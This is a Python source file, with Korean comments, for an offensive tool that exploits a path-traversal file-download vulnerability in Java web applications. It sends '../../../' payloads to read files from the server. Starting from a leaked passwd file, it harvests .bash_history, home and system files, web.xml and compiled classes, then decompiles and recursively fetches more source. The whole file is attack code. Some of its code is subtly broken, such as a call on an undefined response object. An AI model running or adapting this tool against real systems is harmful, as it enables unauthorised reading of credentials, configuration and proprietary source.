import argparse
import requests
import os
import re
import time
import subprocess
from pathlib import Path

from dictionary import (
    home_directory_files,
    system_file,
    targets,
    webTarget,
    file_extensions,
)

BASE_DIR = Path.cwd() / "extract"
BASE_DIR.mkdir(parents=True, exist_ok=True)

downloaded_file = []
homeDir = "" # ex) /home/test
downloaded_class_list = []
WebRoot = [] # ex) /storage/webapps/test/site

# 다운로드 실패 시 0바이트가 아닌 문구 등 바이트 반환될때 고정 값 넣어주기
download_Fail_byte = b""

# class_file extract
IMPORT_PATTERN = re.compile(r"^import com")
PACKAGE_PATTERN = re.compile(r"^package com")


# --passwd 로직

def extract_account(passwd: Path) -> None:
    global homeDir
    with open(passwd, "r") as f:
        for line in f:
            fields = line.rstrip("\n").split(":")
            if len(fields) >= 6:
                account = fields[0]
                home = fields[5]

                if home == "/":
                    bHistory = fields[5] + ".bash_history"
                else:
                    bHistory = fields[5] + "/.bash_history"

                bash_history = download_File(bHistory)
                if bash_history and (not download_Fail_byte or download_Fail_byte not in bash_history):
                    print("WAS was executed by " + account)
                    if fields[5] == "/":
                        homeDir = home
                    else:
                        homeDir = home + "/"
                    mkFile(bash_history, bHistory)

def mkFile(fileContent: bytes, filePath: str):
    save_path = BASE_DIR / filePath.lstrip("/")
    save_path.parent.mkdir(parents=True, exist_ok=True)
    save_path.write_bytes(fileContent)
    print("File Extract : " + str(save_path))

def download_HomeFile():
    for file in home_directory_files:
        if homeDir == "/":
            path = file
        else:
            path = homeDir + file
        result = download_File(path)
        if result and (not download_Fail_byte or download_Fail_byte not in result):
            mkFile(result, path)

def download_SystemFile():
    for file_list in system_file:
        for file in file_list:
            path = file
            result = download_File(path)
            if result and (not download_Fail_byte or download_Fail_byte not in result):
                mkFile(result, path)

def download_File(path: str) -> bytes:
    
    if path in downloaded_file:
        return b""

    # print(path)
    # return b"success Download"

    targetUrl_GET = ""
    targetUrl_POST = ""

    if targetUrl_GET:
        params = {

            "url": path,
        }
        headers = {
            "Cookies": "JESSIONID"
        }
        response = requests.get(url=targetUrl_GET, params=params)
        downloaded_file.append(path)
        time.sleep(0.5)
        if len(response.content) == 0:
            return b""
        else:
            return response.content
    
    elif targetUrl_POST:
        data = {

            "file": path,
            "path": "../../../"

        }
        headers = {
            "Cookies": "JESSIONID"
        }
        response.post(url=targetUrl_POST, data=data)
        downloaded_file.append(path)
        time.sleep(0.5)
        if len(response.content) == 0:
            return b""
        else:
            return response.content


def find_WebRoot(line: str):
    matches = re.findall(r'(/[\w/.-]+)', line)
    for file_path in matches:
        path = Path(file_path)
        if "WEB-INF" in path.parts:
            parts = path.parts
            web_inf_index = parts.index("WEB-INF")
            web_root = str(Path(*parts[:web_inf_index]))
            if web_root not in WebRoot:
                WebRoot.append(web_root)
                print("find WEBROOT : " + web_root)

def download_web_xml():
    if WebRoot:
        for path in WebRoot:
            path = path + "/WEB-INF/web.xml"
            result = download_File(path)
            if result and (not download_Fail_byte or download_Fail_byte not in result):
                mkFile(result, path)

# def extract_download_path():
#     for file in downloaded_file:



def solve_Bash_History():
    relativeHomeDir = homeDir.lstrip("/")
    with open(BASE_DIR / relativeHomeDir / ".bash_history", "r") as f:
        for line in f:

            find_WebRoot(line)

            # "cat ", "vi ", "vim ", "nano ", "touch "로 시작하는 인자 중 절대경로 다운로드
            if line.startswith(targets):
                for target in targets:
                    if line.startswith(target):
                        file_path = line[len(target):].strip()
                        result = download_File(file_path)
                        if result and (not download_Fail_byte or download_Fail_byte not in result):
                            mkFile(result, file_path)

            # tail 인자 중 절대경로  다운로드
            elif line.startswith("tail "):
                match = re.search(r'tail\s+.*?(/[\w/.-]+)', line)
                if match:
                    file_path = match.group(1)
                    result = download_File(file_path)
                    if result and (not download_Fail_byte or download_Fail_byte not in result):
                        mkFile(result, file_path)

            # webTarget 들어간 라인 추출
            elif any(word in line for word in webTarget):
                print("webTarget Detect Line : " + line)
                # 절대경로인 애들 리스트 형태 추출
                matches = re.findall(r'(/[\w/.-]+)', line)
                for file_path in matches:
                    # 마지막에 / 있으면 스킵
                    if file_path.endswith('/'):
                        continue
                    # cd 로 경로 이동한거면 디렉터리 생성 후 스킵
                    elif line.startswith("cd "):
                        local_dir = BASE_DIR / file_path.lstrip("/")
                        local_dir.mkdir(parents=True, exist_ok=True)
                        continue
                    result = download_File(file_path)
                    if result and (not download_Fail_byte or download_Fail_byte not in result):
                        mkFile(result, file_path)
            
            # 즉시 실행 절대경로 탐지 및 파일 다운로드 ex) /opt/tomcat/test/catalina.sh
            else:
                matches = re.findall(r'(\.?/[\w/.-]+)', line)
                for file_path in matches:
                    path_obj = Path(file_path)
                    filename = path_obj.name
                    if file_path.endswith('/') or not filename or filename == '/':
                        continue
                    if line.startswith("cd "):
                        print("find Absolute Path : " + file_path)
                        continue
                    
                    result = download_File(file_path)
                    if result and (not download_Fail_byte or download_Fail_byte not in result):
                        mkFile(result, file_path)

    print("End .bash_history")


# --class_file 로직

def cfr_decompile(cfr_path: Path, class_path: Path) -> list[str]:
    if not cfr_path.is_file():
        raise FileNotFoundError(f"CFR file not Found!!!")
    if not class_path.is_file():
        raise FileNotFoundError(f"class file not Found!!!")
    # print(cfr_path, class_path)

    result = subprocess.run(
        ["java", "-jar", str(cfr_path), str(class_path)],
        capture_output=True,
        text=True
    )
    # print(result.stdout)
    make_directory(result.stdout, class_path)
    return extract_class(result.stdout)

def make_directory(decompiled_result: str, fileName: Path) -> None:
    for line in decompiled_result.splitlines():
        if PACKAGE_PATTERN.search(line):
            # print(line)
            package_name = line.removeprefix("package ").rstrip(";").strip()
            # print(package_name)
            package_dir = Path(package_name.replace(".", "/"))
            package_dir.mkdir(parents=True, exist_ok=True)
            # print(package_dir)
            save_decompile_class_file(decompiled_result, Path(package_dir), Path(fileName).stem)

def save_decompile_class_file(decompile_result: str, save_path: Path, file_name: str):
    output_path = os.path.join(save_path, file_name)+".java"
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(decompile_result)

def extract_class(decompile_class: str) -> list[str]:
    classPath_list = []
    for line in decompile_class.splitlines():
        if IMPORT_PATTERN.search(line):
            class_dir = line.removeprefix("import ").rstrip(";").strip()
            class_name = class_dir.replace(".", "/") + ".class"
            if re.search(r"service", class_name.split("/")[-1], re.IGNORECASE):
                classPath_list.append(class_name)
                classPath_list.append(class_name[:-6] + "Impl.class")
            elif re.search(r"dao", class_name.split("/")[-1], re.IGNORECASE):
                classPath_list.append(class_name)
                classPath_list.append(class_name[:-6] + ".xml")
            else:
                classPath_list.append(class_name)
    return classPath_list

# if you want POST method "targetUrl_GET = ''"
def download_java_classes(classPath_list: list[str]):
    targetUrl_GET = ""
    targetUrl_POST = ""
    WEBROOT = WebRoot + "/WEB-INF/classes/"
    if targetUrl_GET:
        for classPath in classPath_list:
            
            # print(WEBROOT+classPath)
            className = classPath.split("/")[-1]
            if className in downloaded_class_list:
                continue
            
            # Customize Data
            params = {
                "url": WEBROOT + classPath,
            }


            # params = {
            #     "fileNm": "file_name",
            #     # "filePath": file_name
            # }

            # Customize Header
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "JSESSIONID=<session_id>",
            }

            response = requests.get(targetUrl_GET, params=params)

            if len(response.content) == 0:
                continue

            with open(className, "wb") as f:
                downloaded_class_list.append(className)
                f.write(response.content)
                print("extract class : " + className)
            time.sleep(1)
            download_java_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))

    elif targetUrl_POST:
        for file_name in classPath_list:
            
            # Customize Data
            data = {
                "file_Name": file_name,
                "file_Path": "../../../../",
            }
            # data = {
            #     "fileNm": file_name,
            #     "filePath": file_path,
            # }

            # Customize Header
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "JSESSIONID=<session_id>",
                "Referer": "https://example.com/",
                "Origin": "https://example.com",
            }

            response = requests.post(targetUrl_POST, data=data)
            if len(response.content) == 0:
                continue

            with open(file_name, "wb") as f:
                downloaded_class_list.append(className)
                f.write(response.content)
                print("extract class : " + className)
            time.sleep(1)
            download_java_classes(cfr_decompile(Path("./cfr-0.152.jar"), Path(className)))

def main():
    parser = argparse.ArgumentParser(
        description="Java Project Class or File extract via file download vulnerability"
    )
    parser.add_argument("--passwd", help="Leak passwd file")
    parser.add_argument("--class_file", help="Leak .class file path")
    args = parser.parse_args()

    if args.passwd:
        print("extract file via passwd ...")
        extract_account(Path(args.passwd))
        download_HomeFile()
        download_SystemFile()
        if homeDir != "":
            solve_Bash_History()
            download_web_xml()
            # extract_download_path()
        else:
            print("Not Found .bash_history...")
            # 다른 프레임워크 추가 예정
    else:
        print("[*] No passwd file provide...")
    
    # passwd와 병합 예정
    if args.class_file:
        print("extract class file via seed .class ...")
        downloaded_class_list.append(args.class_file)
        classPath_list = cfr_decompile(Path("./cfr-0.152.jar"), Path(args.class_file))
        download_java_classes(classPath_list)
        print("Extract Class\n" + str(downloaded_class_list))
    else:
        print("[*] No .class file provide...")
    
if __name__ == "__main__":
    main()
